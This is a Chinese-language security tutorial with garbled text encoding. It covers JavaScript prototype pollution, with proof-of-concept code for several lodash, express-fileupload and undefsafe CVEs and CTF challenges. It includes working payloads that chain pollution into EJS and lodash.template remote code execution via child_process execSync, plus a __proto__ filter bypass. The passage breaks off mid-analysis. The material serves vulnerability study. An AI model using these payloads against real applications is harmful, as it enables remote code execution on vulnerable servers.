Dog.prototype.sayHi = function() { console.log(\u0026#39;I am\u0026#39;, this.name) } let d = new Dog(\u0026#39;yo\u0026#39;) d.sayHi() // I am yo console.log(d.constructor) // [Function: Dog] æœ€åä¸€è¡Œï¼Œd.constructorå¯ä»¥è¿”å›æ„é€ è¿™ä¸ªå®ä¾‹çš„æœ¬æ¥çš„å‡½æ•°\nfunction test(){} console.log(test.constructor)\t// [Function: Function] console.log(test.constructor === Function.constructor)\t// true ä»»æ„ä¸€ä¸ªå‡½æ•°çš„contructorï¼Œéƒ½å°†ä¼šè¿”å›Function.constructorï¼Œè€Œå®ƒå¯ä»¥ç”¨æ¥æ„é€ å‡½æ•°\nåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä»»æ„å†…å»ºå‡½æ•°æ¥æ„é€ æ–°çš„å‡½æ•°äº†\nvar f1 = [].map.constructor(\u0026#39;console.log(123)\u0026#39;) var f2 = Math.min.constructor(\u0026#39;console.log(456)\u0026#39;) f1()\t// 123 f2()\t// 456 ç”šè‡³\u0026hellip;\u0026hellip;..ä¹Ÿä¸æ˜¯ä¸å¯ä»¥å˜›\nvar f3 = (1).constructor.constructor(\u0026#39;console.log(\u0026#34;abc\u0026#34;)\u0026#39;)() f3()\t// abc åŒç†ï¼Œ[]ï¼Œ''ï¼Œ{}éƒ½æ˜¯å¯ä»¥çš„ï¼Œå•ç‹¬çš„()ä¸è¡Œ å¾—æœ‰æ•°å­—\nåŸå‹é“¾\u0026amp;ç»§æ‰¿ è¿™ä¹ˆå¥½çš„ä¸¤ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°jsçš„ç»§æ‰¿æœºåˆ¶ï¼Œä¸¾ä¸ªä¾‹å­\nfunction Father(){ this.firstName = \u0026#39;Lao\u0026#39; this.lastName = \u0026#39;Wang\u0026#39; } function Son(){ this.firstName = \u0026#39;Ming\u0026#39; } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.firstName} ${son.lastName}`) // Name: Ming Wang son.lastNameè¢«è°ƒç”¨åæŸ¥æ‰¾lastNameæœ‰ä¸€ä¸ªé¡ºåº\nå¯¹è±¡son son.__proto__ son.__proto__.__proto__ son.__proto__.__proto__.__proto__ son.__proto__.__proto__.__proto__.__proto__ -\u0026gt; NULL ç»“æŸ å°±æ˜¯jsè¿™ä¸ªåœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ä½¿ç”¨çš„æŸ¥æ‰¾æœºåˆ¶ï¼Œè¢«ç§°ä½œåŸå‹ç»§æ‰¿é“¾\nâ€”â€”â€”â€”æ³¨æ„åœ¨è¿™ä¸ªæŸ¥æ‰¾çš„è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰å‡ºç°prototypeï¼Œè€Œæ˜¯é€šè¿‡xyz.__proto__æ¥æš´éœ²prototypeï¼ŒçœŸæ­£å‚ä¸æŸ¥æ‰¾çš„ æ˜¯å¯¹è±¡çš„__proto__\nå¦å¤–ï¼Œå¯¹äºç»§æ‰¿çš„è¡¨è¾¾æ–¹å¼é™¤äº†.è¿˜æœ‰[]ï¼Œåè€…ä¸€èˆ¬åœ¨å±æ€§åæ˜¯åŠ¨æ€æ—¶ä½¿ç”¨ï¼Œä¸¤ç§è¡¨è¾¾æ–¹å¼æ˜¯ä¸€æ ·çš„\nåŸå‹é“¾æ±¡æŸ“ æ—¢ç„¶foo.__proto__ == Foo.prototypeï¼Œé‚£ä¿®æ”¹å‰è€…æ˜¯å¦èƒ½ç›´æ¥å½±å“ç±»å‘¢ï¼Ÿ\né¦–å…ˆéœ€è¦æ³¨æ„çš„ï¼š\nWhat\u0026rsquo;s good to note about this property is that it\u0026rsquo;s implemented as a getter/setter property which invokes getPrototypeOf/setPrototypeOf on read/write. So assigning a new value to the property \u0026ldquo;_proto_\u0026rdquo; doesn\u0026rsquo;t shadow the inherited value defined on the prototype. The only way to shadow it invovles using \u0026ldquo;Object.defineProperty\u0026rdquo;.\nè¦æ³¨æ„ï¼Œåªæ˜¯è¿™æ ·çš„ä¿®æ”¹å¹¶ä¸è¶³ä»¥æ±¡æŸ“åŸå‹é“¾ï¼Œåªæ˜¯ä¿®æ”¹å½“å‰è¿è¡ŒçŠ¶æ€ä¸‹è¿™ä¸ªå¯¹è±¡çš„å±æ€§è€Œå·²ï¼Œè¿˜è¦å†å‘ä¸Šæ‰¾ä¸€çº§__proto__\nä¸€ä¸ªæ­£å¸¸çš„æ —å­\næˆ‘ä»¬é€šè¿‡foo.__proto__.barä¿®æ”¹çš„æ˜¯fooçš„åŸå‹ï¼Œå½“ä¿®æ”¹ä¹‹åè°ƒç”¨foo.barç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› å¹¶æ²¡æœ‰ç«‹å³ä¿®æ”¹å€¼ï¼Œè€Œç»§æ‰¿è‡ª{}çš„zooå¯¹è±¡ï¼Œå…¶barå±æ€§å·²ç»è¢«æ±¡æŸ“äº†\nç»¼ä¸Šï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ï¼Œè¿™å°±æ˜¯åŸå‹é“¾æ±¡æŸ“\nåº”ç”¨åœºæ™¯ å¸¸ç”¨çš„ä¸¤ç§ä¿®æ”¹æ–¹å¼\nobj[a][b] = value: obj[__proto__][modify_property] = value obj[a][b][c] = value: obj[constructor][prototype][modify_property] = value åœ¨ä»€ä¹ˆæƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼å‘¢ï¼Ÿæˆ‘ä»¬æ‰¾èƒ½æ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„é”®åçš„æ“ä½œå³å¯\nObject recursive merge Object clone Property defination by path å¯¹è±¡mergeæ“ä½œ function merge(target, source){ for(let key in source){ if(key in source \u0026amp;\u0026amp; key in target){ merge(target[key], source[key])\t// ! }else{ target[key] = source[key] } } } åœ¨ç¬¬å››è¡Œçš„èµ‹å€¼è¿‡ç¨‹ä¸­ï¼Œå¦‚æœkey == '__proto__'æ˜¯å¦ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ\nlet o1 = {} let o2 = {a: 1, \u0026#34;__proto__\u0026#34;: {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) è™½ç„¶mergeæˆåŠŸäº†ï¼Œä½†æ˜¯åŸå‹é“¾è¢«æ²¡æœ‰å—åˆ°æ±¡æŸ“\nåŸå› æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨let o2 = {a: 1, \u0026quot;__proto__\u0026quot;: {b: 2}}åˆ›å»ºo2æ—¶ï¼Œå®é™…çš„ä¸¤ä¸ªé”®åæ˜¯a, bè€Œä¸æ˜¯a, __proto__ï¼Œ__proto__å°±ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ï¼ˆçœ‹èµ·æ¥å¾ˆå¥‡æ€ªï¼Œä½†æ˜¯å°±æ˜¯è¿™æ ·\nè®©å®ƒè¢«è®¤åšä¸€ä¸ªé”®åéœ€è¦ä¿®æ”¹ä¸€ä¸‹åˆ›å»ºo2çš„æ–¹å¼let o2 = JSON.parse('{\u0026quot;a\u0026quot;: 1, \u0026quot;__proto__\u0026quot;: {\u0026quot;b\u0026quot;: 2}}')\nåœ¨JSONè§£æçš„æƒ…å†µä¸‹__proto__è¢«è®¤ä½œæ˜¯é”®åè€Œä¸æ˜¯åŸå‹ï¼Œæ‰€ä»¥æˆåŠŸäº†\nç”±ä¼ å…¥å‚æ•°å®šä¹‰å¯¹è±¡å±æ€§ function theFunc(object, path, value){ object.path = value } å¦‚æœpathå’Œvalueçš„å€¼å¯ä»¥è¢«æˆ‘ä»¬æŒ‡å®šï¼Œæˆ‘ä»¬å¯ä»¥è®¾å®špath = \u0026quot;__proto__.myValue\u0026quot;ï¼Œä¹‹åæŒ‡å®švalueçš„å€¼\nå…·ä½“æ“ä½œå¯è§åé¢çš„CVE-2019-10795(undefsafe)ï¼Œlodash.set\nå¯¹è±¡cloneæ“ä½œ Prototype pollution can happen with API that clone object when the API implements the clone as recursive merge on an empty object. Do note that merge function must be affected by the issue.\nfunction clone(obj){ return merge({}, obj) } æ”»å‡»å®ç° å¥ˆä½•ä¸æ˜¯å¾ˆå¥½å½’ç±»ï¼Œå¦‚æœæŒ‰æ”»å‡»æ–¹å¼å½’ç±»çš„è¯ä¼šå‡ºç°é‡å¤çš„æ¨¡å—å’Œä¸å¥½åˆ†ç±»çš„åœ°æ–¹ï¼Œå‘œå‘œå‘œå‘œå‘œå‘œï¼Œå¥½ä¹±\nå¯¹è±¡mergeæ“ä½œ lodash.mergeWith ç±»ä¼¼lodash.mergeï¼Œå¤šæ¥æ”¶ä¸€ä¸ªå‚æ•°customizer\nmergeWith(object, sources, [customizer]); å¦‚æœæ˜¯undefinedå°±è·Ÿmergeä¸€æ ·äº†\nvar lodash= require(\u0026#39;lodash\u0026#39;); var payload = \u0026#39;{\u0026#34;__proto__\u0026#34;:{\u0026#34;whoami\u0026#34;:\u0026#34;Vulnerable\u0026#34;}}\u0026#39;; var a = {}; console.log(\u0026#34;Before whoami: \u0026#34; + a.whoami); lodash.mergeWith({}, JSON.parse(payload)); console.log(\u0026#34;After whoami: \u0026#34; + a.whoami); ç”±ä¼ å…¥å‚æ•°å®šä¹‰å¯¹è±¡å±æ€§ lodash.set set(object, path, value); è®¾ç½®å€¼åˆ°å¯¹è±¡å¯¹åº”çš„å±æ€§è·¯å¾„ä¸Š\nvar lodash= require(\u0026#39;lodash\u0026#39;); var object_1 = { \u0026#39;a\u0026#39;: [{ \u0026#39;b\u0026#39;: { \u0026#39;c\u0026#39;: 3 } }] }; var object_2 = {} console.log(object_1.whoami); // undefined lodash.set(object_2, \u0026#39;__proto__.[\u0026#34;whoami\u0026#34;]\u0026#39;, \u0026#39;Vulnerable\u0026#39;); console.log(object_1.whoami); // Vulnerable lodash.setWith setWith(object, path, value, [customizer]) POC\nvar lodash= require(\u0026#39;lodash\u0026#39;); var object_1 = { \u0026#39;a\u0026#39;: [{ \u0026#39;b\u0026#39;: { \u0026#39;c\u0026#39;: 3 } }] }; var object_2 = {} console.log(object_1.whoami); // undefined lodash.setWith(object_2, \u0026#39;__proto__.[\u0026#34;whoami\u0026#34;]\u0026#39;, \u0026#39;Vulnerable\u0026#39;); console.log(object_1.whoami); // Vulnerable lodash.defaultsDeep/CVE-2019-10744 const mergeFn = require(\u0026#39;lodash\u0026#39;).defaultsDeep; const payload = \u0026#39;{\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;a0\u0026#34;: true}}}\u0026#39; function check() { mergeFn({}, JSON.parse(payload)); if (({})[`a0`] === true) { console.log(`Vulnerable to Prototype Pollution via ${payload}`); } } check(); æ±¡æŸ“toString\u0026amp;valueOfæ–¹æ³•é€ æˆ500 express-fileupload - CVE-2020-7699 ç‰ˆæœ¬è¦æ±‚ï¼šexpress-fileupload \u0026lt; 1.1.8; parseNested = true express-fileuploadæ¨¡å—å¯ä¸ºexpressåº”ç”¨æä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè¯¥æ¼æ´å¯å¼•å‘DOSï¼Œé…åˆEJSç­‰æ¨¡æ¿å¼•æ“å¯ä»¥è¾¾åˆ°rce\nnpm i express-fileupload@1.1.7-alpha.4 å®šä½åˆ°å…³é”®ä»£ç \nå½“parseNestedä¸ºtureï¼Œå°±ä¼šå®ç°processNestedæ–¹æ³•ï¼Œä¸ä¸Šæ–‡æåˆ°çš„mergeæ–¹æ³•å¾ˆç±»ä¼¼ï¼Œä½†æ˜¯ä»–ä¼šå¯¹ä¼ å…¥çš„å­—å…¸è¿›è¡Œä¸€ä¸ªç¦»è°±çš„åˆ†æï¼Œå½“æˆ‘ä»¬ä¼ å…¥\n{\u0026#34;a.b.c\u0026#34;: \u0026#34;whoami\u0026#34;} è¿”å›çš„æ˜¯\n{ a: { b: { c: \u0026#39;whoami\u0026#39; } } } é‚£æˆ‘ä»¬è¦æ˜¯ä¼ å…¥\n{\u0026#34;__proto__.toString\u0026#34;:\u0026#34;whoami\u0026#34;} å¯ä»¥çœ‹åˆ°æˆ‘ä»¬é›€é£ŸæŠŠObjectå¯¹è±¡çš„toStringæ–¹æ³•ç»™æ±¡æŸ“ä¸ºäº†whoami\nä¸€ä¸ªå®Œæ•´çš„æ —å­\nconst express = require(\u0026#39;express\u0026#39;) const fileupload = require(\u0026#39;express-fileupload\u0026#39;) const app = express() app.use(fileupload({parseNested: true})) app.get(\u0026#39;/\u0026#39;, (req, res)=\u0026gt;{ res.end(\u0026#39;express-fileupload poc\u0026#39;) }) var server = app.listen(3000, function (){ var host = server.address().address var port = server.address().port console.log(\u0026#39;url: http://%s:%s/\u0026#39;, host, port) }) poc\nPOST / HTTP/1.1 Host: 192.168.18.1:3000 Content-Type: multipart/form-data; boundary=--------1566035451 Content-Length: 134 ----------1566035451 Content-Disposition: form-data; name=\u0026#34;__proto__.toString\u0026#34;; filename=\u0026#34;filename\u0026#34; whoami ----------1566035451-- ä¹‹åå†æ¬¡åˆ·æ–°æˆ‘ä»¬çš„httpé¡µé¢\nå·²ç»æˆåŠŸå´©åäº†\nundefsafe - CVE-2019-10795 ç‰ˆæœ¬è¦æ±‚ï¼šUndefsafe \u0026lt; 2.0.3 è¿™ä¸ªæ¨¡å—çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç†è®¿é—®å¯¹è±¡å±æ€§ä¸å­˜åœ¨æ—¶çš„æŠ¥é”™ç›¸å…³é€»è¾‘çš„å‡½æ•°\nnpm i undefsafe@2.0.2 å…ˆç®€å•æµ‹è¯•æ¨¡å—ä½¿ç”¨ï¼Œé¦–å…ˆæ˜¯ç”¨undefinedè§£å†³çƒ¦äººçš„é•¿è°ƒç”¨æ ˆæŠ¥é”™\nvar undefsafe = require(\u0026#39;undefsafe\u0026#39;) var object = { a:{ b:{ c:1, d:[1,2,3], e:\u0026#39;amiz\u0026#39; } } } console.log(object.a.b.e) // amiz console.log(a(object, \u0026#39;a.b.e\u0026#39;)) // amiz console.log(object.a.c.e) // TypeError: Cannot read property \u0026#39;e\u0026#39; of undefined // ..... console.log(undefsafe(object, \u0026#39;a.c.e\u0026#39;)) // undefined ç„¶åæ˜¯ç®€æ˜“èµ‹å€¼\nconsole.log(object) //{ a: { b: { c: 1, d: [Array], e: \u0026#39;amiz\u0026#39; } } } undefsafe(object, \u0026#39;a.b.e\u0026#39;, \u0026#39;123\u0026#39;) console.log(object) // { a: { b: { c: 1, d: [Array], e: \u0026#39;123\u0026#39; } } } ä½†å¦‚æœæˆ‘ä»¬è®¿é—®çš„å±æ€§ä¸å­˜åœ¨\nconsole.log(object) //{ a: { b: { c: 1, d: [Array], e: \u0026#39;amiz\u0026#39; } } } undefsafe(object, \u0026#39;a.f.e\u0026#39;, \u0026#39;123\u0026#39;) console.log(object) // { a: { b: { c: 1, d: [Array], e: \u0026#39;amiz\u0026#39; }, e: \u0026#39;123\u0026#39; } } å®ƒä¼šç›´æ¥ç»™ä½ æ‘èµ·æ¥ï¼Œçœ‹èµ·æ¥è‚¥è‚ çš„å¥‡æ€ª\ndemo1.js\nvar undefsafe = require(\u0026#39;undefsafe\u0026#39;) var object = { a:{ b:{ c:1, d:[1,2,3], e:\u0026#39;amiz\u0026#39; } } } var payload = \u0026#34;__proto__.toString\u0026#34; undefsafe(object, payload, \u0026#34;whoami\u0026#34;) console.log(object.toString) // whoami å½“ä¼ å…¥çš„åä¸¤ä¸ªå‚æ•°å¯æ§æ—¶å¯ä»¥æ±¡æŸ“objectå¯¹è±¡\ndemo2.js\ntest = {} console.log(\u0026#39;this is \u0026#39; + test) // this is [object Object] undefsafe(test, \u0026#39;__proto__.toString\u0026#39;, function (){return \u0026#39;evil code\u0026#39;}) console.log(\u0026#39;this is \u0026#39; + test) // this is evil code å°†å¯¹è±¡å’Œå­—ç¬¦ä¸²æ‹¼æ¥æ—¶è‡ªåŠ¨è°ƒç”¨toStringï¼Œä½†æ˜¯testå¯¹è±¡ä¸­æ²¡æœ‰ï¼Œäºæ˜¯åˆ°test.__proto__ä¸­å¯»æ‰¾ï¼Œæ‰¾åˆ°äº†toStringå¹¶è°ƒç”¨ï¼Œè€Œæ­¤æ—¶toStringå·²ç»è¢«æ±¡æŸ“\nç»“åˆæ¨¡æ¿å¼•æ“RCEçš„å®ä¾‹ express-fileupload - CVE-2020-7699 ç‰ˆæœ¬è¦æ±‚ï¼šexpress-fileupload \u0026lt; 1.1.8; parseNested = true åŒæ ·æ˜¯è¿™ä¸ªç‰ˆæœ¬çš„express-fileuploadï¼Œè¿˜å¯ä»¥ç»“åˆejsæ¨¡æ¿å®ç°RCE\nserver.js\nconst express = require(\u0026#39;express\u0026#39;) const fileupload = require(\u0026#39;express-fileupload\u0026#39;) const app = express() app.use(fileupload({parseNested: true})) app.get(\u0026#39;/\u0026#39;, (req, res)=\u0026gt;{ console.log(Object.prototype.polluted) res.render(\u0026#39;index.ejs\u0026#39;) }) var server = app.listen(3000, function (){ var host = server.address().address var port = server.address().port console.log(\u0026#39;url: http://%s:%s/\u0026#39;, host, port) }) index.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;%= message%\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; poc\nPOST / HTTP/1.1 Host: 192.168.18.1:3000 Content-Type: multipart/form-data; boundary=--------1566035451 Content-Length: 202 ----------1566035451 Content-Disposition: form-data; name=\u0026#34;__proto__.outputFunctionName\u0026#34;; _tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;calc\u0026#39;);var __tmp2 ----------1566035451-- ä¸ä¸Šé¢ç›¸åŒï¼Œå‘é€pocååˆ·æ–°é¡µé¢å³å¯å¼¹è®¡ç®—å™¨\nlodash.merge ç‰ˆæœ¬è¦æ±‚ï¼šlodash \u0026lt; 4.17.11; 4.17.4ä¹‹åè¿‡æ»¤å…³é”®è¯__proto__ï¼Œå¯ç”¨Object.constructor.prototypeè¿›è¡Œç»•è¿‡ server.js\nvar express = require(\u0026#39;express\u0026#39;); var lodash = require(\u0026#39;lodash\u0026#39;); var ejs = require(\u0026#39;ejs\u0026#39;); var app = express(); //è®¾ç½®æ¨¡æ¿çš„ä½ç½®ä¸ç§ç±» app.set(\u0026#39;views\u0026#39;, __dirname); app.set(\u0026#39;views engine\u0026#39;,\u0026#39;ejs\u0026#39;); //å¯¹åŸå‹è¿›è¡Œæ±¡æŸ“ __proto__.xxx var malicious_payload = \u0026#39;{\u0026#34;__proto__\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;calc\\\u0026#39;);var __tmp2\u0026#34;}}\u0026#39;; // 4.17.4ä¹‹åç‰ˆæœ¬è¿›è¡Œ`__proto__`è¿‡æ»¤ ä½¿ç”¨Object.constructor.prototypeç»•è¿‡ // var malicious_payload = \u0026#39;{\u0026#34;Object\u0026#34;:{\u0026#34;constructor\u0026#34;:{\u0026#34;prototype\u0026#34;:{\u0026#34;outputFunctionName\u0026#34;: \u0026#34;_tmp1;global.process.mainModule.constructor._load(\\\u0026#39;child_process\\\u0026#39;).execSync(\\\u0026#39;calc\\\u0026#39;);var __tmp2\u0026#34;}}}}\u0026#39; lodash.merge({}, JSON.parse(malicious_payload)); //è¿›è¡Œæ¸²æŸ“ app.get(\u0026#39;/\u0026#39;, function (req, res) { res.render (\u0026#34;index.ejs\u0026#34;,{ message: \u0026#39;whoami test\u0026#39; }); }); var server = app.listen(8000, function () { var host = server.address().address var port = server.address().port console.log(\u0026#34;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://%s:%s\u0026#34;, host, port) }); åœ¨ç¬¬12è¡Œä¸‹æ–­ç‚¹\nå¯ä»¥çœ‹åˆ°åœ¨å®ƒæ‰§è¡Œç»“æŸä¹‹åObjectçš„åŸå‹é“¾ä¸Šå¤šäº†ä¸€ä¸ªoutputFunctionNameï¼Œæˆ‘ä»¬å…ˆè·Ÿè¿›è°ƒç”¨çœ‹çœ‹åé¢æ¥å…¥ejsçš„éƒ¨åˆ†æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ï¼›åœ¨16è¡Œæ‰“æ–­ç‚¹ï¼Œåˆ·æ–°åçœ‹renderæ–¹æ³•\nè·Ÿå…¥app.render()ï¼Œexpress\\lib\\application.js\nè·Ÿè¿›view.render()ï¼Œexpress\\lib\\view.js\nå¯è§æˆ‘ä»¬çš„æ¶æ„ä»£ç éƒ¨åˆ†è¢«ä»¥optionså‚æ•°çš„å½¢å¼åŠ è½½åˆ°äº†this.engineä¸­ï¼Œä¹‹åengineé€‰ç”¨ejsæ¨¡æ¿å¼•æ“ï¼Œè¿›å…¥ejs\\lib\\ejs.js\nè¿›å…¥renderFileå‡½æ•°ï¼Œè¿”å›tryHandleCache()ï¼Œè·Ÿå…¥\nè·Ÿå…¥compileï¼Œè¿™é‡Œæœ‰å¤§é‡çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæˆ‘ä»¬çš„æ¶æ„ä»£ç å°±è¿™æ ·è¢«æ‹¼è¿›å»äº†\nè¿™é‡Œçš„opts.outputFunctionNameæ­£æ˜¯æˆ‘ä»¬æ±¡æŸ“çš„opts.__proto__outputFunctionNameï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹è¿›å…¥renderçš„opts\nå€’å™äº†å±äºæ˜¯ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªlodash.mergeçš„æ•´ä¸ªè¿‡ç¨‹\næ³¨æ„åˆ°è¿™é‡Œçš„å‡½æ•°å’Œæ³¨é‡Šï¼Œå°±å¾ˆæœ‰åŸå‹æ±¡æŸ“çš„å¯èƒ½å•Š\nå½“æˆ‘ä»¬çš„payloadä»è¿™é‡Œä¼ å…¥çš„æ—¶å€™ï¼Œåœ¨è¿›å…¥baseMergeDeepä¹‹åä¼šå…ˆæœ‰ä¸€ä¸ªsafeGetçš„è¿‡æ»¤\nä½†æ˜¯æˆ‘ä»¬ç”¨prototypeå°±è½»æ¾ç»•è¿‡äº†ï¼Œä¹‹åsrcvalueè¢«èµ‹ç»™newValueï¼Œè¿›å…¥assignMergeValueï¼Œè°ƒç”¨ä¸€æ¬¡baseAssginValue\nå½»åº•å°†prototypeçš„å€¼èµ‹ç»™æˆ‘ä»¬çš„payloadï¼Œåšåˆ°åŸå‹æ±¡æŸ“\nlodash.template ç›´æ¥æ‹¿pç‰›çš„é¢˜ä¸¾ä¾‹äº†ï¼Œè¿™ä¸ªæ´æ˜¯æœ€è¿‘ä¸ä¹…æ‰è¢«ä¿®å¤ï¼Œä¸è¿‡è™½ç„¶è¿™é‡Œåˆ©ç”¨çš„åŒæ ·æ˜¯lodash.mergeï¼Œä¸è¿‡å´å’Œä¸Šé¢çš„lodash.mergeä¸æ˜¯ä¸€æ¡è°ƒç”¨é“¾ï¼Œæ‰€ä»¥å—å½±å“ç‰ˆæœ¬ä¸åŒ\n[Codebreaking 2018]Thejs const fs = require(\u0026#39;fs\u0026#39;) const express = require(\u0026#39;express\u0026#39;) const bodyParser = require(\u0026#39;body-parser\u0026#39;) const lodash = require(\u0026#39;lodash\u0026#39;) const session = require(\u0026#39;express-session\u0026#39;) const randomize = require(\u0026#39;randomatic\u0026#39;) const app = express() app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) app.use(\u0026#39;/static\u0026#39;, express.static(\u0026#39;static\u0026#39;)) app.use(session({ name: \u0026#39;thejs.session\u0026#39;, secret: randomize(\u0026#39;aA0\u0026#39;, 16), resave: false, saveUninitialized: false })) app.engine(\u0026#39;ejs\u0026#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =\u0026gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content)\t// ç»§æ‰¿è‡ªlodash let rendered = compiled({...options}) return callback(null, rendered) }) }) app.set(\u0026#39;views\u0026#39;, \u0026#39;./views\u0026#39;) app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;) app.all(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { let data = req.session.data || {language: [], category: []} if (req.method == \u0026#39;POST\u0026#39;) { data = lodash.merge(data, req.body)\t// å¯ä»¥åŸå‹é“¾æ±¡æŸ“lodash req.session.data = data } res.render(\u0026#39;index\u0026#39;, { language: data.language, category: data.category }) }) app.listen(3000, () =\u0026gt; console.log(`Example app listening on port 3000!`)) æˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“loadsh.mergeç»™Objectå¯¹è±¡æ’å…¥ä»»æ„å±æ€§ï¼Œæœ€åæ±¡æŸ“loadsh.templateï¼›å…·ä½“æ±¡æŸ“lodash.templateçš„å“ªä¸ªå±æ€§ï¼Œè¿˜è¦å‚è€ƒæºç \n// https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 // Use a sourceURL for easier debugging. var sourceURL = \u0026#39;sourceURL\u0026#39; in options ? \u0026#39;//# sourceURL=\u0026#39; + options.sourceURL + \u0026#39;\\n\u0026#39; : \u0026#39;\u0026#39;; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + \u0026#39;return \u0026#39; + source) .apply(undefined, importsValues); }); options.sourceURLæ²¡æœ‰èµ‹å€¼ï¼Œå–ç©ºå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ç»™æ‰€æœ‰Objectå¯¹è±¡æ’å…¥ä¸€ä¸ªsourceURLå±æ€§ï¼Œå°±ä¼šè¢«æ‹¼å…¥return Functionçš„ç¬¬äºŒä¸ªå‚æ•°ä¸­é€ æˆrce\npayload\n{\u0026#34;__proto__\u0026#34;:{\u0026#34;sourceURL\u0026#34;:\u0026#34;\\u000areturn e=\u0026gt;{for(var a in {}){delete Object.prototype[a];}return global.process.mainModule.consturctor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls /\u0026#39;).toString()}\\u000a//\u0026#34;}} å€ŸåŠ©å…¶å®ƒåº“æ‰©å¤§æ”»å‡»é¢ express-validator + lodash lodash\u0026lt;4.17.17 æ¥æºäºä¸€é“CTFé¢˜ï¼ˆè€Œä¸”è¢«æŠ„äº†2æ¬¡è¿˜ï¼‰ï¼Œåœ¨æœ¬èº«lodashå­˜åœ¨åŸå‹æ±¡æŸ“çš„æƒ…å†µä¸‹ç»“åˆå…¶å®ƒåº“æ‰©å¤§æ”»å‡»é¢\n[XNUCACTF 2020 Qualifier]oooooooldjs è¿™ä¸ªé¢˜æœ‰ä¸‰ä¸ªè€ƒç‚¹ï¼Œè¿˜æ˜¯è‚¥è‚ çš„éš¾é¡¶çš„\nåŸå‹é“¾æ±¡æŸ“ï¼šlodash.set + express-validator å¼‚æ­¥bug jQuery RCE gadget express-validatorçš„å…·ä½“å®ç° æˆ‘ä»¬ä»¥ä¸€æ®µä»£ç ä½œä¸ºç¤ºä¾‹\nconst express = require(\u0026#39;express\u0026#39;) const app = express() const port = 1337 app.use(express.json()) app.use(express.urlencoded({ extended: true })) const { body, validationResult } = require(\u0026#39;express-validator\u0026#39;) middlewares = [ body(\u0026#39;*\u0026#39;).trim() ] app.use(middlewares) app.post(\u0026#34;/user\u0026#34;, (req, res)=\u0026gt;{ const foo = \u0026#34;helloworld\u0026#34; return res.status(200).send(foo) }) app.listen(port,()=\u0026gt;{ console.log(`server listening on ${port}`) }) å…¶ä¸­ç¬¬16è¡Œçš„body('*').trim()æ˜¯å¯¹validatorè¿™ä¸€ä¸­é—´ä»¶çš„è®¾ç½®ï¼Œå¯ä»¥åœ¨node_modules\\express-validator\\src\\middlewares\\validation-chain-builders.jsä¸­æ‰¾åˆ°å®ƒçš„å…·ä½“å®ç°\né¦–å…ˆæ˜¯å¯¹body, cookie, header, param, queryè¿™å‡ ä¸ªå¯¹è±¡éƒ½æ˜¯å¯¹buildCheckFunction(['xxxx'])çš„å°è£…ï¼Œç”¨æ¥å®ç°validatorçš„åŠŸèƒ½\nå¦‚æœæˆ‘ä»¬åœ¨ç¬¬6è¡Œä¸‹æ–­ç‚¹ å¯ä»¥çœ‹åˆ°å¯¹åº”çš„å‚æ•°åœ¨ä¾æ¬¡ä¼ å…¥å¹¶è¿”å›ï¼Œå®ƒå…¶å®æ˜¯è°ƒç”¨äº†node_modules\\express-validator\\src\\middlewares\\check.jsä¸­checkçš„å®ç°\nå…ˆçœ‹è¿”å›å€¼ï¼ŒObject.assign()å‡½æ•°ï¼Œé¦–å…ˆæ˜¯utils_1.bindall()å‡½æ•°å°†ä¼ å…¥å¯¹è±¡çš„å‡½æ•°ä½œä¸ºå¯¹è±¡çš„ä¸€ä¸ªå±æ€§è¿›è¡Œç»‘å®š\nä¹‹åå†ä¼ 